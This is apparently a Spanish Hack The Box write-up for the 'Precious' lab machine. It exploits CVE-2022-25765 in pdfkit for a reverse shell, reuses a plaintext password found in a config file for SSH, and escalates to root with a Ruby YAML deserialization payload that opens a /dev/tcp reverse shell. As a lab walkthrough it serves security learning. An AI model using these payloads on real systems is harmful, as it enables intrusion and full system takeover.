QUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACAcyQUAACDc/wcLMYruoW4L+wAAAABJRU5ErkJggg==)

En la web tenemos un formulario para introducir una URL y nos convertirá el contenido de la misma en un PDF.

## 🔭 Reconocimiento: 

```shell
┌──(pmartinezr㉿kali)-[~]
└─$ /usr/bin/whatweb http://precious.htb/
http://precious.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0 + Phusion Passenger(R) 6.0.15], IP[10.129.228.98], Ruby-on-Rails, Title[Convert Web Page to PDF], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-Powered-By[Phusion Passenger(R) 6.0.15], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```

Usando ```whatweb```podemos descubrir que está hecho con ```Ruby-on-rails```, esto nos da una pista de por donde buscar


## CVE: CVE-2022-25765


### 💣 Preparación: 

[https://github.com/lowercasenumbers/CVE-2022-25765](https://github.com/lowercasenumbers/CVE-2022-25765)


``` shell
┌──(pmartinezr㉿kali)-[~/htb/precious]
└─$ python cve-2022-25765.py -t http://precious.htb  -l 10.10.14.110 -p 4444
/home/pmartinezr/htb/precious/cve-2022-25765.py:19: SyntaxWarning: invalid escape sequence '\ '
#  / ___\ \   / / ____|   |___ \ / _ \___ \|___ \    |___ \| ___|___  / /_| ___|  _ __  _   _  #
################################################################################################
#  ______     _______     ____   ___ ____  ____      ____  ____ _____ __  ____                 #
#  / ___\ \   / / ____|   |___ \ / _ \___ \|___ \    |___ \| ___|___  / /_| ___|  _ __  _   _  #
# | |    \ \ / /|  _| _____ __) | | | |__) | __) |____ __) |___ \  / / '_ \___ \ | '_ \| | | | #
# | |___  \ V / | |__|_____/ __/| |_| / __/ / __/_____/ __/ ___) |/ /| (_) |__) || |_) | |_| | #
#  \____|  \_/  |_____|   |_____|\___/_____|_____|   |_____|____//_/  \___/____(_) .__/ \__, | #
#                                                                                |_|    |___/  #
#                                                                                              #
# Exploit Title: pdfkit < 0.8.7.2 - Command Injection                                          #
# Exploit Author: lowercasenumbers                                                             #
# Vendor Homepage: https://pdfkit.org/                                                         #
# Software Link: https://github.com/pdfkit/pdfkit                                              #
# Version: < 0.8.7.2                                                                           #
# Tested on: pdfkit 0.8.6                                                                      #
# CVE: CVE-2022–25765                                                                          #
#                                                                                              #
################################################################################################
> Sending Reverse Shell
> Exploit Completed
> Check your netcat listener
```

## 👽 Acciones: 

``` shell
msf exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 10.10.14.110:4444
[*] Command shell session 1 opened (10.10.14.110:4444 -> 10.129.228.98:53972) at 2026-01-06 00:54:30 +0100
shell
[*] Trying to find binary 'python' on the target machine
[-] python not found
[*] Trying to find binary 'python3' on the target machine
[*] Found python3 at /usr/bin/python3
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary 'bash' on the target machine
[*] Found bash at /usr/bin/bash
ruby@precious:/var/www/pdfapp$ whoami
whoami
ruby
ruby@precious:~/.bundle$ cat config
cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
``` 

Al parecer alguien dejó un archivo con la clave de un usuario ```.bundle/config``` ```henry:Q3c1AqGHtoI0aXAYFH```


```shell
┌──(pmartinezr㉿kali)-[~/htb/precious]
└─$ ssh henry@precious.htb
The authenticity of host 'precious.htb (10.129.228.98)' can't be established.
ED25519 key fingerprint is: SHA256:1WpIxI8qwKmYSRdGtCjweUByFzcn0MSpKgv+AwWRLkU
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'precious.htb' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
henry@precious.htb's password:
Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User henry may run the following commands on precious:
(root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
henry@precious:/opt$ cat /home/henry/user.txt
c8592f5a0251a7f4b************
```

## 🔭 Reconocimiento:
```shell
henry@precious:~$ cat /opt/dependencies.yml
ls /opt/sample -ltr
total 4
-rw-r--r-- 1 root root 26 Sep 22  2022 dependencies.yml
```

No podemos modificar el archivo ```dependencies.yml``` ni el script ```/opt/update_dependencies.rb```

```yml
 # Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'
# TODO: update versions automatically
def update_gems()
end
def list_from_file
YAML.load(File.read("dependencies.yml"))
end
def list_local_gems
Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end
gems_file = list_from_file
gems_local = list_local_gems
gems_file.each do |file_name, file_version|
gems_local.each do |local_name, local_version|
if(file_name == local_name)
if(file_version != local_version)
puts "Installed version differs from the one specified in file: " + local_name
else
puts "Installed version is equals to the one specified in file: " + local_name
end
end
end
end
```

Este sería el contenido original del archivo ```update_dependencies.rb```

## 💣 Preparación: 

``` yml
---
- !ruby/object:Gem::Installer
i: x
- !ruby/object:Gem::SpecFetcher
i: y
- !ruby/object:Gem::Requirement
requirements:
!ruby/object:Gem::Package::TarReader
io: &1 !ruby/object:Net::BufferedIO
io: &1 !ruby/object:Gem::Package::TarReader::Entry
read: 0
header: "abc"
debug_output: &1 !ruby/object:Net::WriteAdapter
socket: &1 !ruby/object:Gem::RequestSet
sets: !ruby/object:Net::WriteAdapter
socket: !ruby/module 'Kernel'
method_id: :system
git_set: "bash -c 'bash -i >& /dev/tcp/10.10.14.110/4444 0>&1'"
method_id: :resolve
```

Sin embargo si puedo recrear el archivo yml con una revershell y lo colocamos en el ```/home/henry```

## 🪲 Explotación:

[https://github.com/v4resk/red-book/blob/main/redteam/privilege-escalation/linux/script-exploits/ruby.md](https://github.com/v4resk/red-book/blob/main/redteam/privilege-escalation/linux/script-exploits/ruby.md) Aquí está la explicación del exploit.

## 👽 Acciones: 

``` shell
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
```

Lanzamos el script con sudo 

```shell
┌──(pmartinezr㉿kali)-[~/htb/precious]
└─$ socat TCP-LISTEN:4444 -
root@precious:/home/henry# cat /root/root.txt
cat /root/root.txt
3e08fed0cf427dfcf************
```

[achivement](https://labs.hackthebox.com/achievement/machine/2336390/513)

